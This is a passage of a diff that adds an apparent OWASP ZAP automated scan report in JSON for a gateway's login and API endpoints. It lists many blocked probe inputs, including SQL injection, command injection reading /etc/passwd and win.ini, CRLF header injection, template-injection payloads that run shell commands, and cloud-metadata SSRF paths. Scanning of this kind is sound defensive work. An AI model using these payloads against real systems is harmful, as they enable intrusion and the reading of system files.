+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "115",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\" UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "95",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "161",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\"\u0026cat \/etc\/passwd\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "170",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\"\u0026type %SYSTEMROOT%\\\\win.ini\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "164",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\";cat \/etc\/passwd;\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "178",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\";get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "172",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\\\"|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "169",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "337",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"Set-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "55",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"URL='http:\/\/5919382108256485925.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "332",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "328",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "330",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "93",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "204",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "144",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"+response.write(193,942*665,742)+\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "381",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"\/><xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "135",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "82",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"><!--#EXEC cmd=\\\"dir \\\\\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "78",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"\\\"><!--#EXEC cmd=\\\"ls \/\\\"--><\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "208",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"]]>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "345",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any?\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "341",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any?\\r\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "347",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any?\\r\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "343",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "339",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any\\r\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "346",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"any\\r\\nSet-cookie: Tamper=eba741d0-54bc-4519-a1b7-fd60e608789a\\r\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "156",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"cat \/etc\/passwd\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "176",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "64",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/\\\\5919382108256485925.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "26",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "22",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "28",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "24",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "30",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"http:\/\/www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "51",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"https:\/\/5919382108256485925%2eowasp%2eorg\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "49",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"https:\/\/5919382108256485925.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "56",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"https:\/\/5919382108256485925.owasp.org\/?John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "62",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"https:\/\/\\\\5919382108256485925.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "146",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"response.write(193,942*665,742)\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "379",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"system-property('xsl:vendor')\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "167",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "319",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"wKaGfXNqlDiqtZDnriYYhtpGnOsSgPBuwOgUXHBnGuKexiGHSrbiSQLNbrXRmZZmypUHXdBMhFfVWfoZVXIBKWCxAsdmnSnZiRErHtLSkYaPIaZPJCypvKDhxGSSkKxIsRXajLvxIUcTLjtywBMSRPQFPiCPlmmUtptpsjvhaOxiVwGFPamjbOSeNfHISyCcvqGyGAGraNZlQYmJSwtrEJBIqIyACcSSSdnMQTEnifcJetcqbdsCwQJJFLmhAYvvkCCRREYFUfDEjMfUQfDaokoKeRnwsAXoEZAKQGOyqYGbJWCbOAxqMunjuRRAfnksssepXRhCJvFGMipkNCUKgjOPAAvvGnZnUPRsaMRGvEqWBiMMqgMgnHfvcDNPhBkGxLCaCAhmxyhGjoHjroxTYnEdZGYQIOydhqWsnXJmtjZeeQmhLiYDApcrFkpjCDPxpEuFjpNLlIBeNaxvrpxbEORxikUdSfFelBPWauKtygRDeyUwjfsBGngJCkSwMmT)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "33",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"www.google.com\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "31",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"www.google.com\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "34",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"www.google.com\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "32",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"www.google.com:80\/\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "35",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"www.google.com:80\/search?q=ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "222",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj 5947*9212 zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "247",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj#set($x=6185*7022)${x}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "233",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj#{4452*3657}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "230",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj${6281*2329}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "246",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj<%=4334*7651%>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "248",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj<p th:text=\\\"${1267*8801}\\\"><\/p>zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "237",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{#9368*6383}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "226",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{4282*7279}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "240",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{@9359*5290}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "249",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{@math key=\\\"6873\\\" method=\\\"multiply\\\" operand=\\\"8503\\\"\/}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "250",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{{23890|add:19810}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "242",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{{7910*5364}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "245",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{{=6436*2037}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "251",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"zj{{print \\\"5773\\\" \\\"4619\\\"}}zj\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "286",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"{system(\\\"sleep 15\\\")}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "271",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "277",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\\\"__builtins__\\\").get(\\\"__import__\\\")(\\\"subprocess\\\").check_output(\\\"sleep 15\\\")}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "281",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"{{__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "276",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"{{range.constructor(\\\"return eval(\\\\\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\\\\\")\\\")()}}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "301",
+							"uri": "http://gateway:8080/api/auth/login/",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "403",
+							"otherinfo": ""
+						},
+						{
+							"id": "225",
+							"uri": "http://gateway:8080/computeMetadata/v1/",
+							"nodeName": "http:\/\/gateway:8080\/computeMetadata\/v1\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "220",
+							"uri": "http://gateway:8080/latest/meta-data/",
+							"nodeName": "http:\/\/gateway:8080\/latest\/meta-data\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "241",
+							"uri": "http://gateway:8080/metadata/instance",
+							"nodeName": "http:\/\/gateway:8080\/metadata\/instance ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "243",
+							"uri": "http://gateway:8080/metadata/v1",
+							"nodeName": "http:\/\/gateway:8080\/metadata\/v1 ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "229",
+							"uri": "http://gateway:8080/opc/v1/instance/",
+							"nodeName": "http:\/\/gateway:8080\/opc\/v1\/instance\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "234",
+							"uri": "http://gateway:8080/opc/v2/instance/",
+							"nodeName": "http:\/\/gateway:8080\/opc\/v2\/instance\/ ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "244",
+							"uri": "http://gateway:8080/openstack/latest/meta_data.json",
+							"nodeName": "http:\/\/gateway:8080\/openstack\/latest\/meta_data.json ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						}
+					],
+					"count": "155",
+					"systemic": false,
+					"solution": "",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "388",
+					"wascid": "20",
+					"sourceid": "32"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-1",
+					"alert": "Non-Storable Content",
+					"name": "Non-Storable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.</p>",
+					"instances":[ 
+						{
+							"id": "3",
+							"uri": "http://gateway:8080/api/orders",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						},
+						{
+							"id": "4",
+							"uri": "http://gateway:8080/api/orders/10",
+							"nodeName": "http:\/\/gateway:8080\/api\/orders\/10",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						},
+						{
+							"id": "7",
+							"uri": "http://gateway:8080/api/products/id",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/id",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						},
+						{
+							"id": "8",
+							"uri": "http://gateway:8080/api/products/search?q=q&order=id",
+							"nodeName": "http:\/\/gateway:8080\/api\/products\/search (order,q)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						},
+						{
+							"id": "5",
+							"uri": "http://gateway:8080/api/auth/login",
+							"nodeName": "http:\/\/gateway:8080\/api\/auth\/login ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>The content may be marked as storable by ensuring that the following conditions are satisfied:</p><p>The request method must be understood by the cache and defined as being cacheable (\"GET\", \"HEAD\", and \"POST\" are currently defined as cacheable)</p><p>The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)</p><p>The \"no-store\" cache directive must not appear in the request or response header fields</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"private\" response directive must not appear in the response</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"Authorization\" header field must not appear in the request, unless the response explicitly allows it (using one of the \"must-revalidate\", \"public\", or \"s-maxage\" Cache-Control response directives)</p><p>In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:</p><p>It must contain an \"Expires\" header field</p><p>It must contain a \"max-age\" response directive</p><p>For \"shared\" caches such as \"proxy\" caches, it must contain a \"s-maxage\" response directive</p><p>It must contain a \"Cache Control Extension\" that allows it to be cached</p><p>It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "11"
+				}
+			]
+		}
+	],
+	"sequences":[
+	]
+
+}
